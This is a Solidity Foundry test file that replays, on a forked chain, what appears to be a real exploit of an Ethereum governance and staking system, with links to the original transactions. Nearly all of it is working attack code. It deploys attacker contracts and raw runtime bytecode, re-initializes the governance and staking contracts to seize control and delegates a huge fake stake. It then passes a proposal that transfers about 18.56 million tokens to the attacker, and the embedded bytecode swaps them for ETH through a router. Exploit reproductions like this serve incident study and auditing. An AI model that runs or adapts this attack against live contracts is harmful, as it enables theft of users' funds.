// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0x4227bca8ed4b8915c7eec0e14ad3748a88c4371d4176e716e8007249b9980dc9
// https://etherscan.io/address/0xa0c7BD318D69424603CBf91e9969870F21B8ab4c

interface I {
    function submitProposal(bytes32, uint256, string memory, bytes memory, string memory, string memory)
        external
        payable;
    function delegateStake(address, uint256) external payable;
    function balanceOf(address) external payable returns (uint256);
    function initialize(address, uint256, uint256, uint256, uint16, address) external payable;
    function evaluateProposalOutcome(uint256) external payable;
    function initialize(address, address) external payable;
    function setServiceProviderFactoryAddress(address) external payable;
    function submitVote(uint256, uint8) external payable;
    function initialize(address, address, uint256) external payable;
}

contract Xbdbb is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x4227bca8ed4b8915c7eec0e14ad3748a88c4371d4176e716e8007249b9980dc9");
    }

    address constant x18aa = 0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998;
    address constant x4d79 = 0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225;
    address constant x4dec = 0x4DEcA517D6817B6510798b7328F2314d3003AbAC;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant xe6d9 = 0xe6D97B2099F142513be7A2a068bE040656Ae4591;

    address xa62c;

    function test1() public {
        vm.createSelectFork("http://localhost:18545", 15201798); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0x4a825bbc50fb7bc1bb86ebf8403ad7f343bd7865c4a9ec9cd32ff50856c55dea));

        // https://explorer.phalcon.xyz/tx/eth/0x4a825bbc50fb7bc1bb86ebf8403ad7f343bd7865c4a9ec9cd32ff50856c55dea
        this.x4a825bbc();
        // https://explorer.phalcon.xyz/tx/eth/0x3bbb15f9852c389e8d77399fe88b49b042d0f22aad4a33c979fbabc60a34b24f
        this.x3bbb15f9();
        // https://explorer.phalcon.xyz/tx/eth/0x3d6c7922d402b89a8970e943ac3d6d39f2fb6a9114fb8abc373385473eca31ac
        this.x3d6c7922();
        // https://explorer.phalcon.xyz/tx/eth/0xfefd829e246002a8fd061eede7501bccb6e244a9aacea0ebceaecef5d877a984
        this.xfefd829e();
        // https://explorer.phalcon.xyz/tx/eth/0x3c09c6306b67737227edc24c663462d870e7c2bf39e9ab66877a980c900dd5d5
        this.x3c09c630();
        // https://explorer.phalcon.xyz/tx/eth/0x4227bca8ed4b8915c7eec0e14ad3748a88c4371d4176e716e8007249b9980dc9
        x543db4c4();
    }

    function test2() public {
        vm.createSelectFork("http://localhost:18545", 15201717); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0x4a825bbc50fb7bc1bb86ebf8403ad7f343bd7865c4a9ec9cd32ff50856c55dea
        this.x4a825bbc();
        vm.warp(1658616877);
        vm.roll(15201735);
        // https://explorer.phalcon.xyz/tx/eth/0x3bbb15f9852c389e8d77399fe88b49b042d0f22aad4a33c979fbabc60a34b24f
        this.x3bbb15f9();
        vm.warp(1658617788);
        vm.roll(15201792);
        // https://explorer.phalcon.xyz/tx/eth/0x3d6c7922d402b89a8970e943ac3d6d39f2fb6a9114fb8abc373385473eca31ac
        this.x3d6c7922();
        vm.warp(1658617812);
        vm.roll(15201793);
        // https://explorer.phalcon.xyz/tx/eth/0xfefd829e246002a8fd061eede7501bccb6e244a9aacea0ebceaecef5d877a984
        this.xfefd829e();
        vm.warp(1658617848);
        vm.roll(15201795);
        // https://explorer.phalcon.xyz/tx/eth/0x3c09c6306b67737227edc24c663462d870e7c2bf39e9ab66877a980c900dd5d5
        this.x3c09c630();
        vm.warp(1658617896);
        vm.roll(15201798);
        // https://explorer.phalcon.xyz/tx/eth/0x4227bca8ed4b8915c7eec0e14ad3748a88c4371d4176e716e8007249b9980dc9
        x543db4c4();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 15201798); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1658617896);
        vm.roll(15201799);
        // https://explorer.phalcon.xyz/tx/eth/0x4227bca8ed4b8915c7eec0e14ad3748a88c4371d4176e716e8007249b9980dc9
        vm.deal(RECEIVER, 10 ether);
        vm.store(
            address(0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998),
            keccak256(abi.encode(RECEIVER, uint256(52))),
            bytes32(uint256(1000000000000000000000000))
        );
        x543db4c4();
    }

    function x4a825bbc() public {
        xa62c = address(new Xa62c());
    }

    function x3d6c7922() public {
        _constructor_();
    }

    function xfefd829e() public {
        r.call(abi.encodeWithSelector(0x5bc7c6ac, 84, 3, 0, 1, 4));
    }

    function x3bbb15f9() public {
        xa62c.call(abi.encodeWithSelector(0x169e8a8e, 82, 83, 3, 0, 1, 4));
    }

    function x543db4c4() public {
        I(x4dec).evaluateProposalOutcome(85);
    }

    function x3c09c630() public {
        r.call(abi.encodeWithSelector(0xcc66ce79, 85));
    }

    function validateAccountStakeBalance(address) public {}

    function x5bc7c6ac() public {
        I(x4dec).initialize(r, 3, 0, 1, 4, r);
        I(x4dec).evaluateProposalOutcome(84);
        // uint256 v1 = 18752017999999999999732870;
        uint256 v1 = I(x18aa).balanceOf(x4dec);
        console2.log("I(x18aa).balanceOf(x4dec)\t->", "18752017999999999999732870 (18752017.9999 ether)");

        bytes memory b03 = abi.encode(r, 18564497819999999999735541);
        I(x4dec)
            .submitProposal(
                0x3078000000000000000000000000000000000000000000000000000000000000,
                0,
                "transfer(address,uint256)",
                b03,
                "Hello",
                "World"
            );

        I(xe6d9).initialize(r, r);
        I(x4d79).initialize(r, r, 1);
        I(x4d79).setServiceProviderFactoryAddress(r);
        I(x4d79).delegateStake(r, 10000000000000000000000000000000);
    }

    function _constructor_() public {
        bytes memory rt =
            hex"6080604052600436106100a75760003560e01c8063543db4c411610064578063543db4c4146101475780635bc7c6ac1461015a578063805833411461016d578063cc66ce7914610182578063e16c7d9814610195578063e8de38c0146101e157600080fd5b806306288885146100ac5780630ea77307146100cd57806323b872dd146100f25780633d183017146101125780633ecc6a43146100ac57806353fb334014610127575b600080fd5b3480156100b857600080fd5b50604051600081526020015b60405180910390f35b3480156100d957600080fd5b506100e2610201565b60405190151581526020016100c4565b3480156100fe57600080fd5b506100e261010d366004610b1a565b61023b565b610125610120366004610b5b565b61025d565b005b34801561013357600080fd5b50610125610142366004610b90565b61044d565b610125610155366004610bbc565b6104f3565b610125610168366004610bd5565b610597565b34801561017957600080fd5b506101256109e2565b610125610190366004610bbc565b610a49565b3480156101a157600080fd5b506101c96101b0366004610bbc565b507318aaa7115705e8be94bffebde57af9bfc265b99890565b6040516001600160a01b0390911681526020016100c4565b3480156101ed57600080fd5b506101256101fc366004610c10565b610adb565b600080546001600160a01b031632146102355760405162461bcd60e51b815260040161022c90610c34565b60405180910390fd5b50600190565b600080546001600160a01b0316321461025357600080fd5b5060019392505050565b6000546001600160a01b031633146102875760405162461bcd60e51b815260040161022c90610c34565b6040805160028082526060820183526000926020830190803683370190505060405163095ea7b360e01b8152737a250d5630b4cf539739df2c5dacb4c659f2488d6004820152701d6329f1c35ca4bfabb9f561000000000060248201529091507318aaa7115705e8be94bffebde57af9bfc265b9989063095ea7b3906044016020604051808303816000875af1158015610325573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103499190610c7f565b50838160008151811061035e5761035e610ca1565b60200260200101906001600160a01b031690816001600160a01b03168152505073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2816001815181106103a6576103a6610ca1565b6001600160a01b0392831660209182029290920101526000546040516318cbafe560e01b8152737a250d5630b4cf539739df2c5dacb4c659f2488d926318cbafe5926103ff928892889288929116904290600401610cb7565b6000604051808303816000875af115801561041e573d6000803e3d6000fd5b505050506040513d6000823e601f3d908101601f191682016040526104469190810190610d28565b5050505050565b6000546001600160a01b031633146104775760405162461bcd60e51b815260040161022c90610c34565b60005460405163a9059cbb60e01b81526001600160a01b039182166004820152602481018390529083169063a9059cbb906044016020604051808303816000875af11580156104ca573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104ee9190610c7f565b505050565b6000546001600160a01b0316331461051d5760405162461bcd60e51b815260040161022c90610c34565b604051630e8edee960e31b815260048101829052734deca517d6817b6510798b7328f2314d3003abac90637476f748906024016020604051808303816000875af115801561056f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105939190610de6565b5050565b6000546001600160a01b031633146105c15760405162461bcd60e51b815260040161022c90610c34565b6040516355c66ac160e01b8152306004820181905260248201869052604482018590526064820184905261ffff8316608483015260a4820152734deca517d6817b6510798b7328f2314d3003abac906355c66ac19060c401600060405180830381600087803b15801561063357600080fd5b505af1158015610647573d6000803e3d6000fd5b5050604051630e8edee960e31b815260048101889052734deca517d6817b6510798b7328f2314d3003abac9250637476f74891506024016020604051808303816000875af115801561069d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106c19190610de6565b506040516370a0823160e01b8152734deca517d6817b6510798b7328f2314d3003abac60048201526000907318aaa7115705e8be94bffebde57af9bfc265b998906370a0823190602401602060405180830381865afa158015610728573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061074c9190610e07565b90506000734deca517d6817b6510798b7328f2314d3003abac639fa0bc9482306064610779876063610e20565b6107839190610e4d565b604080516001600160a01b0390931660208401528201526060016040516020818303038152906040526040518363ffffffff1660e01b81526004016107c9929190610e6f565b6020604051808303816000875af11580156107e8573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061080c9190610e07565b60405163485cc95560e01b81523060048201819052602482015290915073e6d97b2099f142513be7a2a068be040656ae45919063485cc95590604401600060405180830381600087803b15801561086257600080fd5b505af1158015610876573d6000803e3d6000fd5b50506040516305e52ecf60e21b81523060048201819052602482015260016044820152734d7968ebfd390d5e7926cb3587c39eff2f9fb2259250631794bb3c9150606401600060405180830381600087803b1580156108d457600080fd5b505af11580156108e8573d6000803e3d6000fd5b505060405163201ae9db60e01b8152306004820152734d7968ebfd390d5e7926cb3587c39eff2f9fb225925063201ae9db9150602401600060405180830381600087803b15801561093857600080fd5b505af115801561094c573d6000803e3d6000fd5b5050604051633c323a1b60e01b81523060048201526c7e37be2022c0914b26800000006024820152734d7968ebfd390d5e7926cb3587c39eff2f9fb2259250633c323a1b91506044016020604051808303816000875af11580156109b4573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109d89190610e07565b5050505050505050565b6000546001600160a01b03163314610a0c5760405162461bcd60e51b815260040161022c90610c34565b600080546040516001600160a01b03909116914780156108fc02929091818181858888f19350505050158015610a46573d6000803e3d6000fd5b50565b6000546001600160a01b03163314610a735760405162461bcd60e51b815260040161022c90610c34565b604051634cb29fdf60e11b8152734deca517d6817b6510798b7328f2314d3003abac906399653fbe90610aad908490600290600401610f5b565b600060405180830381600087803b158015610ac757600080fd5b505af1158015610446573d6000803e3d6000fd5b6000546001600160a01b03163214610a465760405162461bcd60e51b815260040161022c90610c34565b6001600160a01b0381168114610a4657600080fd5b600080600060608486031215610b2f57600080fd5b8335610b3a81610b05565b92506020840135610b4a81610b05565b929592945050506040919091013590565b600080600060608486031215610b7057600080fd5b8335610b7b81610b05565b95602085013595506040909401359392505050565b60008060408385031215610ba357600080fd5b8235610bae81610b05565b946020939093013593505050565b600060208284031215610bce57600080fd5b5035919050565b600080600080600060a08688031215610bed57600080fd5b505083359560208501359550604085013594606081013594506080013592509050565b600060208284031215610c2257600080fd5b8135610c2d81610b05565b9392505050565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b634e487b7160e01b600052604160045260246000fd5b600060208284031215610c9157600080fd5b81518015158114610c2d57600080fd5b634e487b7160e01b600052603260045260246000fd5b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b81811015610d075784516001600160a01b031683529383019391830191600101610ce2565b50506001600160a01b03969096166060850152505050608001529392505050565b60006020808385031215610d3b57600080fd5b825167ffffffffffffffff80821115610d5357600080fd5b818501915085601f830112610d6757600080fd5b815181811115610d7957610d79610c69565b8060051b604051601f19603f83011681018181108582111715610d9e57610d9e610c69565b604052918252848201925083810185019188831115610dbc57600080fd5b938501935b82851015610dda57845184529385019392850192610dc1565b98975050505050505050565b600060208284031215610df857600080fd5b815160098110610c2d57600080fd5b600060208284031215610e1957600080fd5b5051919050565b6000816000190483118215151615610e4857634e487b7160e01b600052601160045260246000fd5b500290565b600082610e6a57634e487b7160e01b600052601260045260246000fd5b500490565b61060f60f31b815260006020848184015260c06040840152601960c08401527f7472616e7366657228616464726573732c75696e74323536290000000000000060e084015261010080606085015284518082860152600091505b80821015610ee857858201830151858301610120015290820190610ec9565b80821115610efb57600061012082870101525b601f01601f1916840184810361012090810160808701526005818301526448656c6c6f60d81b6101408301529092509050610160820184810360a0860152600581526415dbdc9b1960da1b60208201529150506040810195945050505050565b8281526040810160038310610f8057634e487b7160e01b600052602160045260246000fd5b826020830152939250505056fea26469706673582212207d84988c7b67859e3625392d0cc77c9f63f58309f95e4cf0fab85c6478544f2964736f6c634300080e0033";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function isGovernanceAddress() public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function xcc66ce79() public {
        I(x4dec).submitVote(85, 2);
    }

    function getContract(bytes32) public {
        bytes memory rt = abi.encodePacked(abi.encode(address(x18aa)));
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function transferFrom(address, address, uint256) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function getExecutionDelay() public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function getVotingPeriod() public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0x5bc7c6ac) {
            x5bc7c6ac();
            return;
        }
        if (selector == 0xcc66ce79) {
            xcc66ce79();
            return;
        }
        revert("no such function");
    }
}

contract Xa62c {
    address immutable r = address(this);
    receive() external payable {}
    address constant x18aa = 0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998;
    address constant x4d79 = 0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225;
    address constant x4dec = 0x4DEcA517D6817B6510798b7328F2314d3003AbAC;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant xe6d9 = 0xe6D97B2099F142513be7A2a068bE040656Ae4591;

    constructor() payable {}

    function getContract(bytes32) public {
        bytes memory rt = abi.encodePacked(abi.encode(address(x18aa)));
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function getVotingPeriod() public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function x169e8a8e() public {
        I(x4dec).initialize(r, 3, 0, 1, 4, r);
        I(x4dec).evaluateProposalOutcome(82);
        I(x4dec).evaluateProposalOutcome(83);
        // uint256 v1 = 18752017999999999999732870;
        uint256 v1 = I(x18aa).balanceOf(x4dec);
        console2.log("I(x18aa).balanceOf(x4dec)\t->", "18752017999999999999732870 (18752017.9999 ether)");

        bytes memory b01 = abi.encode(r, 18564497819999999999735541);
        I(x4dec)
            .submitProposal(
                0x3078000000000000000000000000000000000000000000000000000000000000,
                0,
                "transfer(address,uint256)",
                b01,
                "Hello",
                "World"
            );

        I(xe6d9).initialize(r, r);
        I(x4d79).initialize(r, r, 1);
        I(x4d79).setServiceProviderFactoryAddress(r);
        I(x4d79).delegateStake(r, 10000000000000000000000000000000);
    }

    function isGovernanceAddress() public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function transferFrom(address, address, uint256) public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function validateAccountStakeBalance(address) public {}

    function getExecutionDelay() public {
        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    fallback() external payable {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0x169e8a8e) {
            x169e8a8e();
            return;
        }
        revert("no such function");
    }
}
